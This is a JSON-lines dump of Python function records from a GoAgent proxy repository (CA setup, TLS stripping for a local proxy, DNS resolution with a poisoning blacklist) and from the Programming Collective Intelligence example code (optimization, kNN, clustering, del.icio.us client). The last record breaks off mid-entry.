{"docstring": "\"\"\"PHPProxyHandler setup, init domain/iplist map\"\"\"\n", "func_signal": "def first_run(self):\n", "code": "if not common.PROXY_ENABLE:\n    hostname = urlparse.urlsplit(common.PHP_FETCHSERVER).hostname\n    net2 = AdvancedNet2(window=4, ssl_version='TLSv1', dns_servers=common.DNS_SERVERS, dns_blacklist=common.DNS_BLACKLIST)\n    if not common.PHP_HOSTS:\n        common.PHP_HOSTS = net2.gethostsbyname(hostname)\n    net2.add_iplist_alias('php_fetchserver', common.PHP_HOSTS)\n    net2.add_fixed_iplist(common.PHP_HOSTS)\n    net2.add_rule(hostname, 'php_fetchserver')\n    net2.enable_connection_cache()\n    if common.PHP_KEEPALIVE:\n        net2.enable_connection_keepalive()\n    net2.enable_openssl_session_cache()\n    self.__class__.net2 = net2", "path": "goagent_out_of_box_yang\\proxy.py", "repo_name": "yangyangwithgnu/goagent_out_of_box_yang", "stars": 416, "license": "None", "language": "python", "size": 16340}
{"docstring": "#Check CA exists\n", "func_signal": "def check_ca(self):\n", "code": "capath = os.path.join(os.path.dirname(os.path.abspath(__file__)), self.ca_keyfile)\ncertdir = os.path.join(os.path.dirname(os.path.abspath(__file__)), self.ca_certdir)\nif not os.path.exists(capath):\n    if os.path.exists(certdir):\n        any(os.remove(x) for x in glob.glob(certdir+'/*.crt')+glob.glob(certdir+'/.*.crt'))\n    if os.name == 'nt':\n        try:\n            self.remove_ca(self.ca_vendor)\n        except Exception as e:\n            logging.warning('self.remove_ca failed: %r', e)\n    self.dump_ca()\nwith open(capath, 'rb') as fp:\n    self.ca_thumbprint = OpenSSL.crypto.load_certificate(OpenSSL.crypto.FILETYPE_PEM, fp.read()).digest(self.ca_digest)\n#Check Certs\ncertfiles = glob.glob(certdir+'/*.crt')+glob.glob(certdir+'/.*.crt')\nif certfiles:\n    filename = random.choice(certfiles)\n    commonname = os.path.splitext(os.path.basename(filename))[0]\n    with open(filename, 'rb') as fp:\n        serial_number = OpenSSL.crypto.load_certificate(OpenSSL.crypto.FILETYPE_PEM, fp.read()).get_serial_number()\n    if serial_number != self.get_cert_serial_number(commonname):\n        any(os.remove(x) for x in certfiles)\n#Check CA imported\nif self.import_ca(capath) != 0:\n    logging.warning('install root certificate failed, Please run as administrator/root/sudo')\n#Check Certs Dir\nif not os.path.exists(certdir):\n    os.makedirs(certdir)", "path": "goagent_out_of_box_yang\\proxylib.py", "repo_name": "yangyangwithgnu/goagent_out_of_box_yang", "stars": 416, "license": "None", "language": "python", "size": 16340}
{"docstring": "\"\"\"strip connect\"\"\"\n", "func_signal": "def handle(self, handler, do_ssl_handshake=True):\n", "code": "logging.info('%s \"STRIP %s %s:%d %s\" - -', handler.address_string(), handler.command, handler.host, handler.port, handler.protocol_version)\nhandler.send_response(200)\nhandler.end_headers()\nif do_ssl_handshake:\n    try:\n        self.do_ssl_handshake(handler)\n    except (socket.error, ssl.SSLError, OpenSSL.SSL.Error) as e:\n        if e.args[0] not in (errno.ECONNABORTED, errno.ECONNRESET) or (len(e.args) > 1 and e.args[1] == 'Unexpected EOF'):\n            logging.exception('ssl.wrap_socket(connection=%r) failed: %s', handler.connection, e)\n        return\ntry:\n    handler.raw_requestline = handler.rfile.readline(65537)\n    if len(handler.raw_requestline) > 65536:\n        handler.requestline = ''\n        handler.request_version = ''\n        handler.command = ''\n        handler.send_error(414)\n        handler.wfile.close()\n        return\n    if not handler.raw_requestline:\n        handler.close_connection = 1\n        return\n    if not handler.parse_request():\n        handler.send_error(400)\n        handler.wfile.close()\n        return\nexcept (socket.error, ssl.SSLError, OpenSSL.SSL.Error) as e:\n    if e.args[0] in (errno.ECONNABORTED, errno.ECONNRESET, errno.EPIPE):\n        handler.close_connection = 1\n        return\n    else:\n        raise\ntry:\n    handler.do_METHOD()\nexcept (socket.error, ssl.SSLError, OpenSSL.SSL.Error) as e:\n    if e.args[0] not in (errno.ECONNABORTED, errno.ETIMEDOUT, errno.EPIPE):\n        raise", "path": "goagent_out_of_box_yang\\proxylib.py", "repo_name": "yangyangwithgnu/goagent_out_of_box_yang", "stars": 416, "license": "None", "language": "python", "size": 16340}
{"docstring": "\"\"\"\nhttp://gfwrev.blogspot.com/2009/11/gfwdns.html\nhttp://zh.wikipedia.org/wiki/%E5%9F%9F%E5%90%8D%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%BC%93%E5%AD%98%E6%B1%A1%E6%9F%93\nhttp://support.microsoft.com/kb/241352\nhttps://gist.github.com/klzgrad/f124065c0616022b65e5\n\"\"\"\n", "func_signal": "def dnslib_resolve_over_udp(query, dnsservers, timeout, **kwargs):\n", "code": "if not isinstance(query, (basestring, dnslib.DNSRecord)):\n    raise TypeError('query argument requires string/DNSRecord')\nblacklist = kwargs.get('blacklist', ())\nblacklist_prefix = tuple(x for x in blacklist if x.endswith('.'))\nturstservers = kwargs.get('turstservers', ())\ndns_v4_servers = [x for x in dnsservers if ':' not in x]\ndns_v6_servers = [x for x in dnsservers if ':' in x]\nsock_v4 = sock_v6 = None\nsocks = []\nif dns_v4_servers:\n    sock_v4 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n    socks.append(sock_v4)\nif dns_v6_servers:\n    sock_v6 = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)\n    socks.append(sock_v6)\ntimeout_at = time.time() + timeout\ntry:\n    for _ in xrange(4):\n        try:\n            for dnsserver in dns_v4_servers:\n                if isinstance(query, basestring):\n                    if dnsserver in ('8.8.8.8', '8.8.4.4'):\n                        query = '.'.join(x[:-1] + x[-1].upper() for x in query.split('.')).title()\n                    query = dnslib.DNSRecord(q=dnslib.DNSQuestion(query))\n                query_data = query.pack()\n                if query.q.qtype == 1 and dnsserver in ('8.8.8.8', '8.8.4.4'):\n                    query_data = query_data[:-5] + '\\xc0\\x04' + query_data[-4:]\n                sock_v4.sendto(query_data, parse_hostport(dnsserver, 53))\n            for dnsserver in dns_v6_servers:\n                if isinstance(query, basestring):\n                    query = dnslib.DNSRecord(q=dnslib.DNSQuestion(query, qtype=dnslib.QTYPE.AAAA))\n                query_data = query.pack()\n                sock_v6.sendto(query_data, parse_hostport(dnsserver, 53))\n            while time.time() < timeout_at:\n                ins, _, _ = select.select(socks, [], [], 0.1)\n                for sock in ins:\n                    reply_data, reply_address = sock.recvfrom(512)\n                    reply_server = reply_address[0]\n                    record = dnslib.DNSRecord.parse(reply_data)\n                    iplist = [str(x.rdata) for x in record.rr if x.rtype in (1, 28, 255)]\n                    if any(x in blacklist or x.startswith(blacklist_prefix) for x in iplist):\n                        logging.warning('qname=%r dnsservers=%r record bad iplist=%r', query.q.qname, dnsservers, iplist)\n                    elif record.header.rcode and not iplist and reply_server in turstservers:\n                        logging.info('qname=%r trust reply_server=%r record rcode=%s', query.q.qname, reply_server, record.header.rcode)\n                        return record\n                    elif iplist:\n                        logging.debug('qname=%r reply_server=%r record iplist=%s', query.q.qname, reply_server, iplist)\n                        return record\n                    else:\n                        logging.debug('qname=%r reply_server=%r record null iplist=%s', query.q.qname, reply_server, iplist)\n                        continue\n        except socket.error as e:\n            logging.warning('handle dns query=%s socket: %r', query, e)\n    raise socket.gaierror(11004, 'getaddrinfo %r from %r failed' % (query, dnsservers))\nfinally:\n    for sock in socks:\n        sock.close()", "path": "goagent_out_of_box_yang\\proxylib.py", "repo_name": "yangyangwithgnu/goagent_out_of_box_yang", "stars": 416, "license": "None", "language": "python", "size": 16340}
{"docstring": "\"\"\"forward socket\"\"\"\n", "func_signal": "def forward_socket(self, local, remote, timeout, bufsize):\n", "code": "tick = 1\ncount = timeout\nwhile 1:\n    count -= tick\n    if count <= 0:\n        break\n    ins, _, errors = select.select([local, remote], [], [local, remote], tick)\n    if remote in errors:\n        local.close()\n        remote.close()\n        return\n    if local in errors:\n        local.close()\n        remote.close()\n        return\n    if remote in ins:\n        data = remote.recv(bufsize)\n        if not data:\n            remote.close()\n            local.close()\n            return\n        local.sendall(data)\n    if local in ins:\n        data = local.recv(bufsize)\n        if not data:\n            remote.close()\n            local.close()\n            return\n        remote.sendall(data)\n    if ins:\n        count = timeout", "path": "goagent_out_of_box_yang\\proxy.py", "repo_name": "yangyangwithgnu/goagent_out_of_box_yang", "stars": 416, "license": "None", "language": "python", "size": 16340}
{"docstring": "\"\"\"convert dnslib.DNSRecord to iplist\"\"\"\n", "func_signal": "def dnslib_record2iplist(record):\n", "code": "assert isinstance(record, dnslib.DNSRecord)\niplist = [x for x in (str(r.rdata) for r in record.rr) if re.match(r'^\\d+\\.\\d+\\.\\d+\\.\\d+$', x) or ':' in x]\nreturn iplist", "path": "goagent_out_of_box_yang\\proxylib.py", "repo_name": "yangyangwithgnu/goagent_out_of_box_yang", "stars": 416, "license": "None", "language": "python", "size": 16340}
{"docstring": "\"\"\"\nhttp://gfwrev.blogspot.com/2009/11/gfwdns.html\nhttp://zh.wikipedia.org/wiki/%E5%9F%9F%E5%90%8D%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%BC%93%E5%AD%98%E6%B1%A1%E6%9F%93\nhttp://support.microsoft.com/kb/241352\nhttps://gist.github.com/klzgrad/f124065c0616022b65e5\n\"\"\"\n", "func_signal": "def dnslib_resolve_over_udp(query, dnsservers, timeout, **kwargs):\n", "code": "if not isinstance(query, (basestring, dnslib.DNSRecord)):\n    raise TypeError('query argument requires string/DNSRecord')\nblacklist = kwargs.get('blacklist', ())\nturstservers = kwargs.get('turstservers', ())\ndns_v4_servers = [x for x in dnsservers if ':' not in x]\ndns_v6_servers = [x for x in dnsservers if ':' in x]\nsock_v4 = sock_v6 = None\nsocks = []\nif dns_v4_servers:\n    sock_v4 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n    socks.append(sock_v4)\nif dns_v6_servers:\n    sock_v6 = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)\n    socks.append(sock_v6)\ntimeout_at = time.time() + timeout\ntry:\n    for _ in xrange(4):\n        try:\n            for dnsserver in dns_v4_servers:\n                if isinstance(query, basestring):\n                    if dnsserver in ('8.8.8.8', '8.8.4.4'):\n                        query = '.'.join(x[:-1] + x[-1].upper() for x in query.split('.')).title()\n                    query = dnslib.DNSRecord(q=dnslib.DNSQuestion(query))\n                query_data = query.pack()\n                if query.q.qtype == 1 and dnsserver in ('8.8.8.8', '8.8.4.4'):\n                    query_data = query_data[:-5] + '\\xc0\\x04' + query_data[-4:]\n                sock_v4.sendto(query_data, parse_hostport(dnsserver, 53))\n            for dnsserver in dns_v6_servers:\n                if isinstance(query, basestring):\n                    query = dnslib.DNSRecord(q=dnslib.DNSQuestion(query, qtype=dnslib.QTYPE.AAAA))\n                query_data = query.pack()\n                sock_v6.sendto(query_data, parse_hostport(dnsserver, 53))\n            while time.time() < timeout_at:\n                ins, _, _ = select.select(socks, [], [], 0.1)\n                for sock in ins:\n                    reply_data, reply_address = sock.recvfrom(512)\n                    reply_server = reply_address[0]\n                    record = dnslib.DNSRecord.parse(reply_data)\n                    iplist = [str(x.rdata) for x in record.rr if x.rtype in (1, 28, 255)]\n                    if any(x in blacklist for x in iplist):\n                        logging.warning('query=%r dnsservers=%r record bad iplist=%r', query, dnsservers, iplist)\n                    elif record.header.rcode and not iplist and reply_server in turstservers:\n                        logging.info('query=%r trust reply_server=%r record rcode=%s', query, reply_server, record.header.rcode)\n                        return record\n                    elif iplist:\n                        logging.debug('query=%r reply_server=%r record iplist=%s', query, reply_server, iplist)\n                        return record\n                    else:\n                        logging.debug('query=%r reply_server=%r record null iplist=%s', query, reply_server, iplist)\n                        continue\n        except socket.error as e:\n            logging.warning('handle dns query=%s socket: %r', query, e)\n    raise socket.gaierror(11004, 'getaddrinfo %r from %r failed' % (query, dnsservers))\nfinally:\n    for sock in socks:\n        sock.close()", "path": "goagent_out_of_box_yang\\dnsproxy.py", "repo_name": "yangyangwithgnu/goagent_out_of_box_yang", "stars": 416, "license": "None", "language": "python", "size": 16340}
{"docstring": "\"\"\"Send a MIME header.\"\"\"\n", "func_signal": "def send_header(self, keyword, value):\n", "code": "base_send_header = BaseHTTPServer.BaseHTTPRequestHandler.send_header\nkeyword = keyword.title()\nif keyword == 'Set-Cookie':\n    for cookie in re.split(r', (?=[^ =]+(?:=|$))', value):\n        base_send_header(self, keyword, cookie)\nelif keyword == 'Content-Disposition' and '\"' not in value:\n    value = re.sub(r'filename=([^\"\\']+)', 'filename=\"\\\\1\"', value)\n    base_send_header(self, keyword, value)\nelse:\n    base_send_header(self, keyword, value)", "path": "goagent_out_of_box_yang\\proxylib.py", "repo_name": "yangyangwithgnu/goagent_out_of_box_yang", "stars": 416, "license": "None", "language": "python", "size": 16340}
{"docstring": "\"\"\"GAEProxyHandler setup, init domain/iplist map\"\"\"\n", "func_signal": "def first_run(self):\n", "code": "if not common.PROXY_ENABLE:\n    logging.info('resolve common.IPLIST_ALIAS names=%s to iplist', list(common.IPLIST_ALIAS))\n    common.resolve_iplist()\nrandom.shuffle(common.GAE_APPIDS)\nself.__class__.handler_plugins['gae'] = GAEFetchPlugin(common.GAE_APPIDS, common.GAE_PASSWORD, common.GAE_PATH, common.GAE_MODE, common.GAE_CACHESOCK, common.GAE_KEEPALIVE, common.GAE_OBFUSCATE, common.GAE_PAGESPEED, common.GAE_VALIDATE, common.GAE_OPTIONS)\nif not common.PROXY_ENABLE:\n    net2 = AdvancedNet2(window=common.GAE_WINDOW, ssl_version=common.GAE_SSLVERSION, dns_servers=common.DNS_SERVERS, dns_blacklist=common.DNS_BLACKLIST)\n    for name, iplist in common.IPLIST_ALIAS.items():\n        net2.add_iplist_alias(name, iplist)\n        if name == 'google_hk':\n            for delay in (30, 60, 150, 240, 300, 450, 600, 900):\n                spawn_later(delay, self.extend_iplist, name)\n    net2.add_fixed_iplist(common.IPLIST_PREDEFINED)\n    for pattern, hosts in common.RULE_MAP.items():\n        net2.add_rule(pattern, hosts)\n    if common.GAE_CACHESOCK:\n        net2.enable_connection_cache()\n    if common.GAE_KEEPALIVE:\n        net2.enable_connection_keepalive()\n    net2.enable_openssl_session_cache()\n    self.__class__.net2 = net2", "path": "goagent_out_of_box_yang\\proxy.py", "repo_name": "yangyangwithgnu/goagent_out_of_box_yang", "stars": 416, "license": "None", "language": "python", "size": 16340}
{"docstring": "\"\"\"dns query over tcp\"\"\"\n", "func_signal": "def dnslib_resolve_over_tcp(query, dnsservers, timeout, **kwargs):\n", "code": "if not isinstance(query, (basestring, dnslib.DNSRecord)):\n    raise TypeError('query argument requires string/DNSRecord')\nblacklist = kwargs.get('blacklist', ())\nblacklist_prefix = tuple(x for x in blacklist if x.endswith('.'))\ndef do_resolve(query, dnsserver, timeout, queobj):\n    if isinstance(query, basestring):\n        qtype = dnslib.QTYPE.AAAA if ':' in dnsserver else dnslib.QTYPE.A\n        query = dnslib.DNSRecord(q=dnslib.DNSQuestion(query, qtype=qtype))\n    query_data = query.pack()\n    sock_family = socket.AF_INET6 if ':' in dnsserver else socket.AF_INET\n    sock = socket.socket(sock_family)\n    rfile = None\n    try:\n        sock.settimeout(timeout or None)\n        sock.connect(parse_hostport(dnsserver, 53))\n        sock.send(struct.pack('>h', len(query_data)) + query_data)\n        rfile = sock.makefile('r', 1024)\n        reply_data_length = rfile.read(2)\n        if len(reply_data_length) < 2:\n            raise socket.gaierror(11004, 'getaddrinfo %r from %r failed' % (query.q.qname, dnsserver))\n        reply_data = rfile.read(struct.unpack('>h', reply_data_length)[0])\n        record = dnslib.DNSRecord.parse(reply_data)\n        iplist = [str(x.rdata) for x in record.rr if x.rtype in (1, 28, 255)]\n        if any(x in blacklist or x.startswith(blacklist_prefix) for x in iplist):\n            logging.debug('qname=%r dnsserver=%r record bad iplist=%r', query.q.qname, dnsserver, iplist)\n            raise socket.gaierror(11004, 'getaddrinfo %r from %r failed' % (query, dnsserver))\n        else:\n            logging.debug('qname=%r dnsserver=%r record iplist=%s', query.q.qname, dnsserver, iplist)\n            queobj.put(record)\n    except socket.error as e:\n        logging.debug('qname=%r dnsserver=%r failed %r', query.q.qname, dnsserver, e)\n        queobj.put(e)\n    finally:\n        if rfile:\n            rfile.close()\n        sock.close()\nqueobj = Queue.Queue()\nfor dnsserver in dnsservers:\n    thread.start_new_thread(do_resolve, (query, dnsserver, timeout, queobj))\nfor i in range(len(dnsservers)):\n    try:\n        result = queobj.get(timeout)\n    except Queue.Empty:\n        raise socket.gaierror(11004, 'getaddrinfo %r from %r failed' % (query, dnsservers))\n    if result and not isinstance(result, Exception):\n        return result\n    elif i == len(dnsservers) - 1:\n        logging.warning('dnslib_resolve_over_tcp %r with %s return %r', query, dnsservers, result)\nraise socket.gaierror(11004, 'getaddrinfo %r from %r failed' % (query, dnsservers))", "path": "goagent_out_of_box_yang\\proxylib.py", "repo_name": "yangyangwithgnu/goagent_out_of_box_yang", "stars": 416, "license": "None", "language": "python", "size": 16340}
{"docstring": "# Initialize the values randomly\n", "func_signal": "def annealingoptimize(domain,costf,T=10000.0,cool=0.95,step=1):\n", "code": "vec=[float(random.randint(domain[i][0],domain[i][1])) \n     for i in range(len(domain))]\n\nwhile T>0.1:\n  # Choose one of the indices\n  i=random.randint(0,len(domain)-1)\n\n  # Choose a direction to change it\n  dir=random.randint(-step,step)\n\n  # Create a new list with one of the values changed\n  vecb=vec[:]\n  vecb[i]+=dir\n  if vecb[i]<domain[i][0]: vecb[i]=domain[i][0]\n  elif vecb[i]>domain[i][1]: vecb[i]=domain[i][1]\n\n  # Calculate the current cost and the new cost\n  ea=costf(vec)\n  eb=costf(vecb)\n  p=pow(math.e,(-eb-ea)/T)\n\n  # Is it better, or does it make the probability\n  # cutoff?\n  if (eb<ea or random.random()<p):\n    vec=vecb      \n\n  # Decrease the temperature\n  T=T*cool\nreturn vec", "path": "\u7b2c05\u7ae0 \u4f18\u5316\\optimization.py", "repo_name": "zouhongzhao/Programming-Collective-Intelligence-Source-Code", "stars": 370, "license": "None", "language": "python", "size": 214}
{"docstring": "# Trims empty dict entries\n# {'a':'a', 'b':'', 'c': 'c'} => {'a': 'a', 'c': 'c'}\n", "func_signal": "def dict0(d):\n", "code": "dd = dict()\nfor i in d:\n        if d[i] != \"\": dd[i] = d[i]\nreturn dd", "path": "\u7b2c02\u7ae0 \u63d0\u4f9b\u63a8\u8350\\pydelicious.py", "repo_name": "zouhongzhao/Programming-Collective-Intelligence-Source-Code", "stars": 370, "license": "None", "language": "python", "size": 214}
{"docstring": "# Create a random solution\n", "func_signal": "def hillclimb(domain,costf):\n", "code": "sol=[random.randint(domain[i][0],domain[i][1])\n    for i in range(len(domain))]\n# Main loop\nwhile 1:\n  # Create list of neighboring solutions\n  neighbors=[]\n  \n  for j in range(len(domain)):\n    # One away in each direction\n    if sol[j]>domain[j][0]:\n      neighbors.append(sol[0:j]+[sol[j]+1]+sol[j+1:])\n    if sol[j]<domain[j][1]:\n      neighbors.append(sol[0:j]+[sol[j]-1]+sol[j+1:])\n\n  # See what the best solution amongst the neighbors is\n  current=costf(sol)\n  best=current\n  for j in range(len(neighbors)):\n    cost=costf(neighbors[j])\n    if cost<best:\n      best=cost\n      sol=neighbors[j]\n\n  # If there's no improvement, then we've reached the top\n  if best==current:\n    break\nreturn sol", "path": "\u7b2c05\u7ae0 \u4f18\u5316\\optimization.py", "repo_name": "zouhongzhao/Programming-Collective-Intelligence-Source-Code", "stars": 370, "license": "None", "language": "python", "size": 214}
{"docstring": "# Make a range for the prices\n", "func_signal": "def probabilitygraph(data,vec1,high,k=5,weightf=gaussian,ss=5.0):\n", "code": "t1=arange(0.0,high,0.1)\n\n# Get the probabilities for the entire range\nprobs=[probguess(data,vec1,v,v+0.1,k,weightf) for v in t1]\n\n# Smooth them by adding the gaussian of the nearby probabilites\nsmoothed=[]\nfor i in range(len(probs)):\n  sv=0.0\n  for j in range(0,len(probs)):\n    dist=abs(i-j)*0.1\n    weight=gaussian(dist,sigma=ss)\n    sv+=weight*probs[j]\n  smoothed.append(sv)\nsmoothed=array(smoothed)\n  \nplot(t1,smoothed)\nshow()", "path": "\u7b2c08\u7ae0 \u6784\u5efa\u4ef7\u683c\u6a21\u578b\\numpredict.py", "repo_name": "zouhongzhao/Programming-Collective-Intelligence-Source-Code", "stars": 370, "license": "None", "language": "python", "size": 214}
{"docstring": "# Create the image\n", "func_signal": "def drawnetwork(sol):\n", "code": "img=Image.new('RGB',(400,400),(255,255,255))\ndraw=ImageDraw.Draw(img)\n\n# Create the position dict\npos=dict([(people[i],(sol[i*2],sol[i*2+1])) for i in range(0,len(people))])\n\nfor (a,b) in links:\n  draw.line((pos[a],pos[b]),fill=(255,0,0))\n\nfor n,p in pos.items():\n  draw.text(p,n,(0,0,0))\n\nimg.show()", "path": "\u7b2c05\u7ae0 \u4f18\u5316\\socialnetwork.py", "repo_name": "zouhongzhao/Programming-Collective-Intelligence-Source-Code", "stars": 370, "license": "None", "language": "python", "size": 214}
{"docstring": "# Simple sums\n", "func_signal": "def pearson(v1,v2):\n", "code": "sum1=sum(v1)\nsum2=sum(v2)\n\n# Sums of the squares\nsum1Sq=sum([pow(v,2) for v in v1])\nsum2Sq=sum([pow(v,2) for v in v2])\t\n\n# Sum of the products\npSum=sum([v1[i]*v2[i] for i in range(len(v1))])\n\n# Calculate r (Pearson score)\nnum=pSum-(sum1*sum2/len(v1))\nden=sqrt((sum1Sq-pow(sum1,2)/len(v1))*(sum2Sq-pow(sum2,2)/len(v1)))\nif den==0: return 0\n\nreturn 1.0-(num/den)", "path": "\u7b2c10\u7ae0 \u5bfb\u627e\u72ec\u7acb\u7279\u5f81\\clusters.py", "repo_name": "zouhongzhao/Programming-Collective-Intelligence-Source-Code", "stars": 370, "license": "None", "language": "python", "size": 214}
{"docstring": "# Get distances\n", "func_signal": "def weightedknn(data,vec1,k=5,weightf=gaussian):\n", "code": "dlist=getdistances(data,vec1)\navg=0.0\ntotalweight=0.0\n\n# Get weighted average\nfor i in range(k):\n  dist=dlist[i][0]\n  idx=dlist[i][1]\n  weight=weightf(dist)\n  avg+=weight*data[idx]['result']\n  totalweight+=weight\nif totalweight==0: return 0\navg=avg/totalweight\nreturn avg", "path": "\u7b2c08\u7ae0 \u6784\u5efa\u4ef7\u683c\u6a21\u578b\\numpredict.py", "repo_name": "zouhongzhao/Programming-Collective-Intelligence-Source-Code", "stars": 370, "license": "None", "language": "python", "size": 214}
{"docstring": "\"\"\"Call an HTTP server with authorization credentials using urllib2.\n\"\"\"\n", "func_signal": "def http_auth_request(url, host, user, passwd, user_agent=USER_AGENT):\n", "code": "if DEBUG: httplib.HTTPConnection.debuglevel = 1\n\n# Hook up handler/opener to urllib2\npassword_manager = urllib2.HTTPPasswordMgrWithDefaultRealm()\npassword_manager.add_password(None, host, user, passwd)\nauth_handler = urllib2.HTTPBasicAuthHandler(password_manager)\nopener = urllib2.build_opener(auth_handler)\nurllib2.install_opener(opener)\n\nreturn http_request(url, user_agent)", "path": "\u7b2c02\u7ae0 \u63d0\u4f9b\u63a8\u8350\\pydelicious.py", "repo_name": "zouhongzhao/Programming-Collective-Intelligence-Source-Code", "stars": 370, "license": "None", "language": "python", "size": 214}
{"docstring": "\"\"\"Handle a request for RSS\n\n@todo: translate from German\n\nrss sollte nun wieder funktionieren, aber diese try, except scheisse ist so nicht schoen\n\nrss wird unterschiedlich zusammengesetzt. ich kann noch keinen einheitlichen zusammenhang\nzwischen daten (url, desc, ext, usw) und dem feed erkennen. warum k[o]nnen die das nicht einheitlich machen?\n\"\"\"\n", "func_signal": "def dlcs_rss_request(tag = \"\", popular = 0, user = \"\", url = ''):\n", "code": "tag = str2quote(tag)\nuser = str2quote(user)\nif url != '':\n    # http://del.icio.us/rss/url/efbfb246d886393d48065551434dab54\n    url = DLCS_RSS + '''url/%s'''%md5.new(url).hexdigest()\nelif user != '' and tag != '':\n    url = DLCS_RSS + '''%(user)s/%(tag)s'''%dict(user=user, tag=tag)\nelif user != '' and tag == '':\n    # http://del.icio.us/rss/delpy\n    url = DLCS_RSS + '''%s'''%user\nelif popular == 0 and tag == '':\n    url = DLCS_RSS\nelif popular == 0 and tag != '':\n    # http://del.icio.us/rss/tag/apple\n    # http://del.icio.us/rss/tag/web2.0\n    url = DLCS_RSS + \"tag/%s\"%tag\nelif popular == 1 and tag == '':\n    url = DLCS_RSS + '''popular/'''\nelif popular == 1 and tag != '':\n    url = DLCS_RSS + '''popular/%s'''%tag\nrss = http_request(url).read()\nrss = feedparser.parse(rss)\n# print rss", "path": "\u7b2c02\u7ae0 \u63d0\u4f9b\u63a8\u8350\\pydelicious.py", "repo_name": "zouhongzhao/Programming-Collective-Intelligence-Source-Code", "stars": 370, "license": "None", "language": "python", "size": 214}
{"docstring": "\"\"\"Assign a set of tags to a single bundle, wipes away previous\nsettings for bundle. Returns a `result` messages or raises an\n``DeliciousError``. See ``self.request()``.\n\n&bundle (required)\n    the bundle name.\n&tags (required)\n    list of tags (space seperated).\n\"\"\"\n", "func_signal": "def bundles_set(self, bundle, tags, **kwds):\n", "code": "if type(tags)==list:\n    tags = \" \".join(tags)\nreturn self.request(\"tags/bundles/set\", bundle=bundle, tags=tags,\n        **kwds)", "path": "\u7b2c02\u7ae0 \u63d0\u4f9b\u63a8\u8350\\pydelicious.py", "repo_name": "zouhongzhao/Programming-Collective-Intelligence-Source-Code", "stars": 370, "license": "None", "language": "python", "size": 214}
{"docstring": "#get_svr_probability will handle error checking\n", "func_signal": "def get_svr_pdf(self):\n", "code": "sigma = self.get_svr_probability()\nreturn lambda z: exp(-fabs(z)/sigma)/(2*sigma)", "path": "\u7b2c09\u7ae0 \u9ad8\u9636\u5206\u7c7b \u6838\u65b9\u6cd5\u4e0eSVM\\svm.py", "repo_name": "zouhongzhao/Programming-Collective-Intelligence-Source-Code", "stars": 370, "license": "None", "language": "python", "size": 214}
{"docstring": "\"\"\"Parse any del.icio.us XML document and return Python data structure.\n\nRecognizes all XML document formats as returned by the version 1 API and\ntranslates to a JSON-like data structure (dicts 'n lists).\n\nReturned instance is always a dictionary. Examples::\n\n {'posts': [{'url':'...','hash':'...',},],}\n {'tags':['tag1', 'tag2',]}\n {'dates': [{'count':'...','date':'...'},], 'tag':'', 'user':'...'}\n\t {'result':(True, \"done\")}\n # etcetera.\n\"\"\"\n\n", "func_signal": "def dlcs_parse_xml(data, split_tags=False):\n", "code": "if DEBUG>3: print >>sys.stderr, \"dlcs_parse_xml: parsing from \", data\n\nif not hasattr(data, 'read'):\n    data = StringIO(data)\n\ndoc = parse_xml(data)\nroot = doc.getroot()\nfmt = root.tag", "path": "\u7b2c02\u7ae0 \u63d0\u4f9b\u63a8\u8350\\pydelicious.py", "repo_name": "zouhongzhao/Programming-Collective-Intelligence-Source-Code", "stars": 370, "license": "None", "language": "python", "size": 214}
{"docstring": "# Convert the number list into a dictionary of person:(x,y)\n", "func_signal": "def crosscount(v):\n", "code": "loc=dict([(people[i],(v[i*2],v[i*2+1])) for i in range(0,len(people))])\ntotal=0\n\n# Loop through every pair of links\nfor i in range(len(links)):\n  for j in range(i+1,len(links)):\n\n    # Get the locations \n    (x1,y1),(x2,y2)=loc[links[i][0]],loc[links[i][1]]\n    (x3,y3),(x4,y4)=loc[links[j][0]],loc[links[j][1]]\n    \n    den=(y4-y3)*(x2-x1)-(x4-x3)*(y2-y1)\n\n    # den==0 if the lines are parallel\n    if den==0: continue\n\n    # Otherwise ua and ub are the fraction of the\n    # line where they cross\n    ua=((x4-x3)*(y1-y3)-(y4-y3)*(x1-x3))/den\n    ub=((x2-x1)*(y1-y3)-(y2-y1)*(x1-x3))/den\n    \n    # If the fraction is between 0 and 1 for both lines\n    # then they cross each other\n    if ua>0 and ua<1 and ub>0 and ub<1:\n      total+=1\n  for i in range(len(people)):\n    for j in range(i+1,len(people)):\n      # Get the locations of the two nodes\n      (x1,y1),(x2,y2)=loc[people[i]],loc[people[j]]\n\n      # Find the distance between them\n      dist=math.sqrt(math.pow(x1-x2,2)+math.pow(y1-y2,2))\n      # Penalize any nodes closer than 50 pixels\n      if dist<50:\n        total+=(1.0-(dist/50.0))\n      \nreturn total", "path": "\u7b2c05\u7ae0 \u4f18\u5316\\socialnetwork.py", "repo_name": "zouhongzhao/Programming-Collective-Intelligence-Source-Code", "stars": 370, "license": "None", "language": "python", "size": 214}
{"docstring": "# Remove all the HTML tags\n", "func_signal": "def getwords(html):\n", "code": "txt=re.compile(r'<[^>]+>').sub('',html)\n\n# Split words by all non-alpha characters\nwords=re.compile(r'[^A-Z^a-z]+').split(txt)\n\n# Convert to lowercase\nreturn [word.lower() for word in words if word!='']", "path": "\u7b2c03\u7ae0 \u53d1\u73b0\u7fa4\u7ec4\\generatefeedvector.py", "repo_name": "zouhongzhao/Programming-Collective-Intelligence-Source-Code", "stars": 370, "license": "None", "language": "python", "size": 214}
{"docstring": "\"\"\"Calls a path in the API, parses the answer to a JSON-like structure by\ndefault. Use with ``_raw=True`` or ``call request_raw()`` directly to\nget the filehandler and process the response message manually.\n\nCalls to some paths will return a `result` message, i.e.::\n\n    <result code=\"...\" />\n\nor::\n\n    <result>...</result>\n\nThese are all parsed to ``{'result':(Boolean, MessageString)}`` and this\nmethod will raise ``DeliciousError`` on negative `result` answers. Using\n``_raw=True`` bypasses all parsing and will never raise ``DeliciousError``.\n\nSee ``dlcs_parse_xml()`` and ``self.request_raw()``.\"\"\"\n\n# method _parse_response is bound in `__init__()`, `_call_server`\n# uses `_api_request` also set in `__init__()`\n", "func_signal": "def request(self, path, _raw=False, **params):\n", "code": "if _raw:\n    # return answer\n    return self.request_raw(path, **params)\n\nelse:\n    # get answer and parse\n    fl = self._call_server(path, **params)\n    rs = self._parse_response(fl)", "path": "\u7b2c02\u7ae0 \u63d0\u4f9b\u63a8\u8350\\pydelicious.py", "repo_name": 